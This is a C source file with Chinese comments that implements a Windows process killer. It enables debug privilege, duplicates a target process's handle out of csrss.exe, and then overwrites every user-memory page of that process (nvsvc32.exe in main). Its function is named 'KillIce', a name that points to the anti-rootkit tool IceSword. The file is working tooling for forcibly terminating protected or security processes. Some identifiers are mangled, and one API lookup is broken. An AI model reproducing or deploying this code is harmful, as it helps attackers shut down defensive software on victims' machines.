
```
#include <Windows.h>
#include <Ntsecapi.h>
#include <Aclapi.h>
#include <tlhelp32.h>
#pragma comment (lib,"Kernel32.lib")
#pragma comment (lib,"Advapi32.lib")

#pragma comment(linker, "/ENTRY:main")
//------------------ 数据类型声明开始 --------------------//
typedef struct _PROCES***ASIC_INFORMATION {
     NTSTATUS ExitStatus;
     ULONG PebBaseAddress;
     ULONG_PTR AffinityMask;
     LONG BasePriority;
     ULONG_PTR UniqueProcessId;
     ULONG_PTR InheritedFromUniqueProcessId;
} PROCES***ASIC_INFORMATION;
typedef PROCES***ASIC_INFORMATION *PPROCES***ASIC_INFORMATION;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
     ULONG         ProcessId;
     UCHAR         ObjectTypeNumber;
     UCHAR         Flags;
     USHORT        Handle;
     PVOID         Object;
     ACCESS_MASK    GrantedAccess;
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
typedef struct _SYSTEM_MODULE_INFORMATION {
ULONG Reserved[2];
PVOID Base;
ULONG Size;
ULONG Flags;
USHORT Index;
USHORT Unknown;
USHORT LoadCount;
USHORT ModuleNameOffset;
CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
ULONG Length;
HANDLE RootDirectory;
PUNICODE_STRING ObjectName;
ULONG Attributes;
PVOID SecurityDescriptor;
PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef enum _SECTION_INHERIT {
ViewShare = 1,
   ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _MY_PROCESS_INFO {
ULONG PID;
ULONG KPEB;
ULONG CR3;
CHAR Name[16];
ULONG Reserved;
} MY_PROCESS_INFO, *PMY_PROCESS_INFO;
typedef struct _CLIENT_ID {
     HANDLE UniqueProcess;
     HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

typedef long NTSTATUS;

//------------------ 数据类型声明结束 --------------------//

//--------------------- 预定义开始 -----------------------//
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS         0x00000000
#define STATUS_UNSUCCESSFUL     0xC0000001
#define STATUS_NOT_IMPLEMENTED     0xC0000002
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_INVALID_PARAMETER   0xC000000D
#define STATUS_ACCESS_DENIED     0xC0000022
#define STATU***UFFER_TOO_SMALL   0xC0000023
#define OBJ_KERNEL_HANDLE     0x00000200
#define SystemModuleInformation   11
#define SystemHandleInformation   0x10

#define InitializeObjectAttributes( p, n, a, r, s ) { (p)->Length = sizeof( OBJECT_ATTRIBUTES );(p)->RootDirectory = r;           (p)->Attributes = a;           (p)->ObjectName = n;           (p)->SecurityDescriptor = s;         (p)->SecurityQualityOfService = NULL;       }
//--------------------- 预定义结束 -----------------------//

//------------------ Native API 声明开始 ------------------//

typedef DWORD (_stdcall *XXXZwQuerySystemInformation)(
                ULONG SystemInformationClass,
                PVOID SystemInformation,
                ULONG SystemInformationLength,
                PULONG ReturnLength
                );

typedef DWORD (_stdcall *XXXZwOpenProcess)(
               OUT PHANDLE       ProcessHandle,
               IN ACCESS_MASK     AccessMask,
               IN POBJECT_ATTRIBUTES   ObjectAttributes,
               IN PCLIENT_ID     ClientId
               );

typedef DWORD (_stdcall *XXXZwAllocateVirtualMemory)(
                IN HANDLE         ProcessHandle,
                IN OUT PVOID      *BaseAddress,
                IN ULONG           ZeroBits,
                IN OUT PULONG     RegionSize,
                IN ULONG           AllocationType,
                IN ULONG           Protect
                );

typedef DWORD (_stdcall *XXXZwDuplicateObject)(
                IN HANDLE         SourceProcessHandle,
                IN PHANDLE       SourceHandle,
                IN HANDLE         TargetProcessHandle,
                OUT PHANDLE      TargetHandle,
                IN ACCESS_MASK     DesiredAccess OPTIONAL,
                IN BOOLEAN         InheritHandle,
                IN ULONG           Options
                );

typedef DWORD (_stdcall *XXXZwQueryInformationProcess)(
                IN HANDLE         ProcessHandle,
                IN PVOID     ProcessInformationClass,
                OUT PVOID         ProcessInformation,
                IN ULONG           ProcessInformationLength,
                OUT PULONG         ReturnLength
                );

typedef DWORD (_stdcall *XXXZwProtectVirtualMemory)(
               IN HANDLE         ProcessHandle,
               IN OUT PVOID      *BaseAddress,
               IN OUT PULONG     NumberOfBytesToProtect,
               IN ULONG           NewAccessProtection,
               OUT PULONG         OldAccessProtection
               );

typedef DWORD (_stdcall *XXXZwWriteVirtualMemory)(
                IN HANDLE         ProcessHandle,
                IN PVOID           BaseAddress,
                IN PVOID           Buffer,
                IN ULONG           NumberOfBytesToWrite,
                OUT PULONG         NumberOfBytesWritten OPTIONAL
                );

typedef DWORD (_stdcall *XXXZwClose)(
           IN HANDLE         ObjectHandle
           );

typedef DWORD (_stdcall *XXXZwFreeVirtualMemory)(
               IN HANDLE         ProcessHandle,
               IN PVOID           *BaseAddress,
               IN OUT PULONG     RegionSize,
               IN ULONG           FreeType
               );

//------------------ Native API 声明结束 ------------------//

//------------------ 程序正式开始 ------------------//

DWORD GetPidByName(char *szName)
{
HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
PROCESSENTRY32 pe32={0};
DWORD dwRet=0;

hProcessSnap =CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if(hProcessSnap == INVALID_HANDLE_VALUE)return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);
if(Process32First(hProcessSnap, &pe32))
{
   do
   {
    if(lstrcmpi(szName,pe32.szExeFile)==0)
    {
     dwRet=pe32.th32ProcessID;
     break;
    }
   }while (Process32Next(hProcessSnap,&pe32));
}
else return 0;

if(hProcessSnap !=INVALID_HANDLE_VALUE)CloseHandle(hProcessSnap);
return dwRet;
}

void KillIce(ULONG dwProcessId)
{
HMODULE hNTDLL = LoadLibrary ("ntdll");
HANDLE     ph, h_dup;
ULONG      bytesIO;
PVOID      buf;
ULONG        i;
CLIENT_ID     cid1;
OBJECT_ATTRIBUTES     attr;
HANDLE        csrss_id;
//   HANDLE     SnapShotHandle;
PROCES***ASIC_INFORMATION     pbi;
PVOID        p0, p1;
ULONG        sz, oldp;
ULONG        NumOfHandle;
PSYSTEM_HANDLE_INFORMATION     h_info;   

csrss_id = (HANDLE)GetPidByName("csrss.exe");
attr.Length = sizeof(OBJECT_ATTRIBUTES);
attr.RootDirectory = 0;
attr.ObjectName = 0;
attr.Attributes = 0;
attr.SecurityDescriptor = 0;
attr.SecurityQualityOfService = 0;

cid1.UniqueProcess = csrss_id;
cid1.UniqueThread = 0;
XXXZwOpenProcess ZwOpenProcess;
ZwOpenProcess = (XXXZwOpenProcess)GetProcAddress( GetModuleHandle("ntdll.dll"), "ZwOpenProcess");
ZwOpenProcess(&ph, PROCESS_ALL_ACCESS, &attr, &cid1);

bytesIO = 0x400000;
buf = 0;
XXXZwAllocateVirtualMemory ZwAllocateVirtualMemory;
ZwAllocateVirtualMemory = (XXXZwAllocateVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwAllocateVirtualMemory");
ZwAllocateVirtualMemory(GetCurrentProcess(), &buf, 0, &bytesIO, MEM_COMMIT, PAGE_READWRITE);

XXXZwQuerySystemInformation ZwQuerySystemInformation;
ZwQuerySystemInformation = (XXXZwQuerySystemInformation)GetProcAddress( GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");
ZwQuerySystemInformation(SystemHandleInformation, buf, 0x400000, &bytesIO);
NumOfHandle = (ULONG)buf;
h_info = ( PSYSTEM_HANDLE_INFORMATION )((ULONG)buf+4);

for (i= 0 ; i<NumOfHandle; i++, h_info++)
{    
   if ((h_info->ProcessId == (ULONG)csrss_id)&&(h_info->ObjectTypeNumber == 5))
   {
    XXXZwDuplicateObject ZwDuplicateObject;
    ZwDuplicateObject = (XXXZwDuplicateObject)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwDuplicateObject");
    XXXZwQueryInformationProcess ZwQueryInformationProcess;
    ZwQueryInformationProcess = (XXXZwQueryInformationProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQueryInformationProcess");
    if (ZwDuplicateObject(ph, (PHANDLE)h_info->Handle, (HANDLE)-1, &h_dup,
     0, 0, DUPLICATE_SAME_ACCESS) == STATUS_SUCCESS)
     ZwQueryInformationProcess(h_dup, 0, &pbi, sizeof(pbi), &bytesIO);
    if (pbi.UniqueProcessId == dwProcessId)
    {
     MessageBox(0, "目标已确定!", "OK", MB_OK);
     XXXZwProtectVirtualMemory ZwProtectVirtualMemory;
     ZwProtectVirtualMemory = (XXXZwProtectVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwProtectVirtualMemory");
     XXXZwWriteVirtualMemory ZwWriteVirtualMemory;
     ZwWriteVirtualMemory = (XXXZwWriteVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwWriteVirtualMemory");
     XXXZwClose ZwClose;
     ZwClose = (XXXZwClose)GetProcAddress(GetModuleHandle("ZwClose"), "ZwClose");
     for (i = 0x1000; i<0x80000000; i = i + 0x1000)
     {
      p0 = (PVOID)i;
      p1 = p0;
      sz = 0x1000;
      if (ZwProtectVirtualMemory(h_dup, &p1, &sz, PAGE_EXECUTE_READWRITE, &oldp) == STATUS_SUCCESS)
      {               
       ZwWriteVirtualMemory(h_dup, p0, buf, 0x1000, &oldp);
      }           
     }
     MessageBox(0, "任务已完成！","OK", 0);
     ZwClose(h_dup);     
     break;
    }
   }
}

bytesIO = 0;
XXXZwFreeVirtualMemory ZwFreeVirtualMemory;
ZwFreeVirtualMemory = (XXXZwFreeVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"),   "ZwFreeVirtualMemory");
ZwFreeVirtualMemory(GetCurrentProcess(), &buf, &bytesIO, MEM_RELEASE);

FreeLibrary(hNTDLL);    

}

BOOL EnablePrivilege(HANDLE hToken,LPCTSTR szPrivName,BOOL fEnable)
{
TOKEN_PRIVILEGES tp;
tp.PrivilegeCount = 1;
LookupPrivilegeValue(NULL,szPrivName,&tp.Privileges[0].Luid);
tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED:0;
AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
return((GetLastError() == ERROR_SUCCESS));
}

void main()
{     
     ULONG Pid;
     HANDLE hToken;
     OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken);
     EnablePrivilege(hToken,SE_DEBUG_NAME,TRUE);
     if (Pid = GetPidByName("nvsvc32.exe"))
     {
         KillIce(Pid);
     }     
     ExitProcess(0);
}
```
